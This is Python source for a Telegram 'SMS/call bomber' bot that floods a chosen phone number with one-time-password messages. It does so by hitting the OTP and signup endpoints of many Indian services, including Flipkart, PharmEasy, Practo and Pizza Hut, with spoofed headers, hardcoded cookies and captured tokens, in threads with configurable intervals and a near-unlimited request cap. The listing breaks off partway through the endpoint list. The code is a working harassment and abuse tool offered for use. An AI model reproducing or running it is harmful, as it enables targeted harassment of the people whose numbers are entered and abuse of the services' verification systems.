import os
import logging
import asyncio
import json
import io
import threading
import time
import random
import requests
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import aiohttp
from database import (
    init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
    get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids,
    update_user_phone, get_user_phone
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
PORT = int(os.getenv("PORT", 10000))
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")
if not WEBHOOK_URL:
    WEBHOOK_URL = "https://bomber-2hra.onrender.com"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Branding
BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"

# ------------------------------------------------------------------
# Bombing configuration
# ------------------------------------------------------------------
DEFAULT_COUNTRY_CODE = "91"
BOMBING_INTERVAL_SECONDS = 8
MIN_INTERVAL = 1
MAX_INTERVAL = 60
MAX_REQUEST_LIMIT = 900000000000
TELEGRAM_RATE_LIMIT_SECONDS = 5
AUTO_STOP_SECONDS = 20 * 60          # 20 minutes
CALL_INTERVAL_SECONDS = 10            # Fixed gap between call APIs

bombing_active = {}          # user_id -> threading.Event
bombing_threads = {}         # user_id -> list of threads
user_intervals = {}          # user_id -> current interval (for SMS/WhatsApp)
user_start_time = {}         # user_id -> start timestamp
global_request_counter = threading.Lock()
request_counts = {}          # user_id -> total requests

session = requests.Session()
BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*'
}

# ================================================================
#                     ORIGINAL 31 APIS (getapi)
# ================================================================
def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)

    url_urllib = [
        "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(cc) + "&nod=4&phone=" + pn,
        "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn,
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn
    ]
    if lim < len(url_urllib):
        try:
            urllib.request.urlopen(str(url_urllib[lim]), timeout=5)
            return True
        except (urllib.error.HTTPError, urllib.error.URLError, Exception):
            return False

    try:
        if lim == 3: # PharmEasy
            headers = {
                'Host': 'pharmeasy.in', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://pharmeasy.in/', 'Content-Type': 'application/json', 'Connection': 'keep-alive',
            }
            data = {"contactNumber": pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 4: # Hero MotoCorp
            cookies = {
                '_ga': 'GA1.2.1273460610.1561191565', '_gid': 'GA1.2.172574299.1561191565',
                'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
            }
            headers = {
                'Host': 'www.heromotocorp.com', 'Connection': 'keep-alive', 'Accept': '*/*',
                'Origin': 'https://www.heromotocorp.com', 'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/', 'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
                'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
                'mobile_no_otp': '', 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
            }
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 5: # IndiaLends
            cookies = {
                '_ga': 'GA1.2.1483885314.1559157646', '_fbp': 'fb.1.1559157647161.1989205138',
                'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs', '_gid': 'GA1.2.969623705.1560660444',
            }
            headers = {
                'Host': 'indialends.com', 'Connection': 'keep-alive', 'Accept': '*/*',
                'Origin': 'https://indialends.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://indialends.com/personal-loan', 'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
                'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'
            }
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 6: # Flipkart 1
            headers = {
                'host': 'www.flipkart.com', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                'accept': '*/*', 'accept-language': 'en-US,en;q=0.5', 'accept-encoding': 'gzip, deflate, br',
                'referer': 'https://www.flipkart.com/', 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop',
                'origin': 'https://www.flipkart.com', 'connection': 'keep-alive',
                'Content-Type': 'application/json; charset=utf-8'
            }
            data = {"loginId": [f"+{cc}{pn}"], "supportAllStates": True}
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 7: # Flipkart 2
            cookies = {
                'T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050', 'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
                'lux_uid': '155867904381892986', 'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
            }
            headers = {
                'Host': 'www.flipkart.com', 'Connection': 'keep-alive', 'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
                'Origin': 'https://www.flipkart.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*',
                'Referer': 'https://www.flipkart.com/', 'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
                'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'
            }
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 8: # Lenskart
            headers = {
                'Host': 'www.ref-r.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'Connection': 'keep-alive',
            }
            data = {'mobile': pn, 'submit': '1', 'undefined': ''}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 9: # Practo
            headers = {
                'X-DROID-VERSION': '4.12.5', 'API-Version': '2.0', 'user-agent': 'samsung SM-G9350 0 4.4.2',
                'client-version': 'Android-4.12.5', 'X-DROID-VERSION-CODE': '158', 'Accept': 'application/json',
                'client-name': 'Practo Android App', 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'accounts.practo.com', 'Connection': 'Keep-Alive',
            }
            data = {
                'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}', 'fingerprint': '', 'device_name': 'samsung+SM-G9350'
            }
            response = session.post("https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()

        elif lim == 10: # PizzaHut
            headers = {
                'Host': 'm.pizzahut.co.in', 'content-length': '114', 'origin': 'https://m.pizzahut.co.in',
                'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5iTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4',
                'x-source-origin': 'PWAFW', 'content-type': 'application/json', 'accept': 'application/json, text/plain, */*',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'save-data': 'on', 'languagecode': 'en', 'referer': 'https://m.pizzahut.co.in/login',
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 'cookie': 'AKA_A2=A'
            }
            data = {"customer": {"MobileNo": pn, "UserName": pn, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 11: # Goibibo
            headers = {
                'host': 'www.goibibo.com', 'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.5',
                'accept-encoding': 'gzip, deflate, br', 'referer': 'https://www.goibibo.com/mobile/?sms=success',
                'content-type': 'application/x-www-form-urlencoded', 'connection': 'keep-alive',
                'upgrade-insecure-requests': '1'
            }
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 12: # Apollo Pharmacy
            headers = {
                'Host': 'www.apollopharmacy.in', 'accept': '*/*',
                'origin': 'https://www.apollopharmacy.in', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
                'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'
            }
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data, timeout=5)
            return "sent" in response.text.lower()

        elif lim == 13: # Ajio
            headers = {
                'Host': 'www.ajio.com', 'Connection': 'keep-alive', 'Accept': 'application/json',
                'Origin': 'https://www.ajio.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/json', 'Referer': 'https://www.ajio.com/signup',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'
            }
            data = {"firstName": "SpeedX", "login": "johnyaho@gmail.com", "password": "Rock@5star", "genderType": "Male", "mobileNumber": pn, "requestType": "SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text

        elif lim == 14: # AltBalaji
            headers = {
                'Host': 'api.cloud.altbalaji.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://lite.altbalaji.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
                'Content-Type': 'application/json;charset=UTF-8', 'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'
            }
            data = {"country_code": cc, "phone_number": pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.text == '24f467b24087ff48c96321786d89c69f'

        elif lim == 15: # Aala
            headers = {
                'Host': 'www.aala.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Origin': 'https://www.aala.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://www.aala.com/',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.5,ar;q=0.5'
            }
            data = {'email': f'{cc}{pn}', 'firstname': 'SpeedX', 'lastname': 'SpeedX'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, data=data, timeout=5)
            return 'code:' in response.text

        elif lim == 16: # Grab
            data = {
                'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'
            }
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code == 200

        elif lim == 17: # GheeAPI (gokwik.co - 19g6im8srkz9y)
            headers = {
                "accept": "application/json, text/plain, */*",
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
                "content-type": "application/json",
                "gk-merchant-id": "19g6im8srkz9y",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 18: # EdzAPI (gokwik.co - 19an4fq2kk5y)
            headers = {
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
                "content-type": "application/json",
                "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 19: # FalconAPI (api.breeze.in)
            headers = {
                "Content-Type": "application/json",
                "x-device-id": "A1pKVEDhlv66KLtoYsml3",
                "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
            }
            data = {
                "phoneNumber": pn,
                "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"
            }
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 20: # NeclesAPI (gokwik.co - 19g6ilhej3mfc)
            headers = {
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6ilhej3mfc",
                "gk-signature": "645574",
                "gk-timestamp": "58581194"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 21: # KisanAPI (oidc.agrevolution.in)
            headers = {
                "Content-Type": "application/json"
            }
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "true" in response.text.lower()

        elif lim == 22: # PWAPI (api.penpencil.co)
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "randomid": "de6f4924-22f5-42f5-ad80-02080277eef7"
            }
            data = {
                "mobile": pn,
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 23: # KahatBook (api.khatabook.com)
            headers = {
                "Content-Type": "application/json",
                "x-kb-app-locale": "en",
                "x-kb-app-name": "Khatabook Website",
                "x-kb-app-version": "000100",
                "x-kb-new-auth": "false",
                "x-kb-platform": "web"
            }
            data = {
                "country_code": f"+{cc}",
                "phone": pn,
                "app_signature": "Jc/Zu7qNqQ2"
            }
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "success" in response.text.lower()

        elif lim == 24: # JockeyAPI (www.jockey.in)
            cookies = {
                "localization": "IN", "_shopify_y": "6556c530-8773-4176-99cf-f587f9f00905",
                "_tracking_consent": "3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ", "_ga": "GA1.1.377231092.1757430108",
                "_fbp": "fb.1.1757430108545.190427387735094641", "_quinn-sessionid": "a2465823-ceb3-4519-9f8d-2a25035dfccd",
                "cart": "hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06",
                "wishlist_id": "7531056362789hypmaaup", "wishlist_customer_id": "0",
                "_shopify_s": "d4985de8-eb08-47a0-9f41-84adb52e6298"
            }
            headers = {
                "accept": "*/*",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "origin": "https://www.jockey.in",
                "referer": "https://www.jockey.in/"
            }
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{pn}?whatsapp=true"
            response = session.get(url, headers=headers, cookies=cookies, timeout=5)
            return response.status_code == 200

        elif lim == 25: # FasiinAPI (gokwik.co - 19kc37zcdyiu)
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
                "gk-merchant-id": "19kc37zcdyiu",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        # 26: VidyaKul
        elif lim == 26:
            cookies = {
                'gcl_au': '1.1.1308751201.1759726082',
                'initialTrafficSource': 'utmcsr=live|utmcmd=organic|utmccn=(not set)|utmctr=(not provided)',
                '__utmzzses': '1',
                '_fbp': 'fb.1.1759726083644.475815529335417923',
                '_ga': 'GA1.2.921745508.1759726084',
                '_gid': 'GA1.2.1800835709.1759726084',
                '_gat_UA-106550841-2': '1',
                '_hjSession_2242206': 'eyJpZCI6ImQ0ODFkMjIwLTQwMWYtNDU1MC04MjZhLTRlNWMxOGY4YzEyYSIsImMiOjE3NTk3MjYwODQyMDMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
                'trustedsite_visit': '1',
                'ajs_anonymous_id': '1681028f-79f7-458e-bf04-00aacdefc9d3',
                '_hjSessionUser_2242206': 'eyJpZCI6IjZhNWE4MzJlLThlMzUtNTNjNy05N2ZjLTI0MzNmM2UzNjllMSIsImNyZWF0ZWQiOjE3NTk3MjYwODQyMDEsImV4aXN0aW5nIjp0cnVlfQ==',
                'vidyakul_selected_languages': 'eyJpdiI6IkJzY1FUdUlodlRMVXhCNnE5V2RDT1E9PSIsInZhbHVlIjoiTTBcL2RKNmU2b1Fab1BnS3FqSDBHQktQVlk0SXRmczIxSGJrakhOaTJ5dllyclZiTk5FeVBGREE3dzVJbXI5T0oiLCJtYWMiOiI5MWU4NDViZDVhOTFjM2NmMmYyZjYwMmRiMmQyNGU4NTRlYjQ0MGM3ZTJmNjIzM2Q2M2ZhNTM0ZTVjMGUzZmUyIn0=',
                'WZRK_S_4WZ-K47-ZZ6Z': '%7B%22p%22%3A3%7D',
                'vidyakul_selected_stream': 'eyJpdiI6Ik0rb3pnN0gwc21pb1JsbktKNkdXOFE9PSIsInZhbHVlIjoibE9rWGhTXC8xQk1OektzXC9zNXlcLzloR0xjQ2hCMU5nT2pobU0rMU1FbjNSOD0iLCJtYWMiOiJiZjY4MWFhNWM2YzE4ZmViMDhlNWI2OGQ5YmNjM2I3NjNhOTJhZDc5ZDk3ZWE1MGM5OTA4MTA5ODhmMjRkZjk2In0=',
                '_ga_53F4FQTTGN': 'GS2.2.s1759726084$o1$g1$t1759726091$j53$l0$h0',
                'mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3A7b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22%24device_id%22%3A%227b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22mp_lib%22%3A%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%22bing%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D',
                'XSRF-TOKEN': 'eyJpdiI6IjFTYW9wNmVJQjY3TFpEU2RYeEdNbkE9PSIsInZhbHVlIjoidmErTnBFcU1JVHpFN2daOENRVG9aQ1RNU25tZnQ1dkM2M1hkQitSdVZRNGxtZUVpTFNvbjM2NlwvVEpLTkFqcCtiTHhNbjVDZWhSK3h1VytGQ0NiRFRRPT0iLCJtYWMiOiI1ZjM3ZDk1YzMwZTYzOTMzM2YwYzFhYTgyNjYzZDRmYWE4ZWQwMDdhYzM1MTdlM2NkNjgzZTNjNWNjZmI2ZWQ4In0=',
                'vidyakul_session': 'eyJpdiI6IlNDQWNpU2ZXMTEraENaaGtsQkJPMmc9PSIsInZhbHVlIjoicXFRbWVqNXhiejlwTFFpXC9OVmdWQkZsODhjUVpvenE0eTB3cGFiQ2F4ckx5Y3dcL3Z1S1NmNnhRNEduV01WT3Q1d2pKMlF3blpySU5YUU5vUldFTFI1dz09IiwibWFjIjoiOWFjNTM1NmQyMTg2YWE0MGZiMzljOGM0MDMzZjc4NWQyNzM0NTU4MzhkZjczNjU3OGNhNGM0Yjg2ZTEwZTJhMSJ9'
            }
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://vidyakul.com',
                'referer': 'https://vidyakul.com/explore-courses/class-10th/english-medium-biharboard',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0',
                'x-csrf-token': 'fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q',
                'x-requested-with': 'XMLHttpRequest'
            }
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 27: Aditya Birla Capital
        elif lim == 27:
            cookies = {
                '_gcl_au': '1.1.781134033.1759810407',
                '_gid': 'GA1.2.1720693822.1759810408',
                'sess_map': 'eqzbxwcubfayctusrydzbesabydweezdbateducxxdcrxstydtyzrbrtzsuqbdaswwuffravtvutuzuqcsvrtescduettszavexcraaevefqbwccdwvqucftswtzqxtbafdfycqwuqvryswywubrayfrbbfcszcywqsdyauttdaaybsq',
                '_ga': 'GA1.3.1436666301.1759810408',
                'WZRK_G': 'd74161bab0c042e8a9f0036c8570fe44',
                'mfKey': '14m4ctv.1759810410656',
                '_ga_DBHTXT8G52': 'GS2.1.s1759810408$o1$g1$t1759810411$j57$l0$h328048196',
                '_uetsid': 'fc23aaa0a33311f08dc6ad31d162998d',
                '_uetvid': 'fc23ea50a33311f081d04545d889f28285',
                '_ga_KWL2JXMSG9': 'GS2.1.s1759810411$o1$g1$t1759810814$j54$l0$h0',
                'WZRK_S_884-575-6R7Z': '%7B%22p%22%3A3%2C%22s%22%3A1759810391%2C%22t%22%3A1759810815%7D'
            }
            headers = {
                'Accept': '/*',
                'Accept-Language': 'en-US,en;q=0.9',
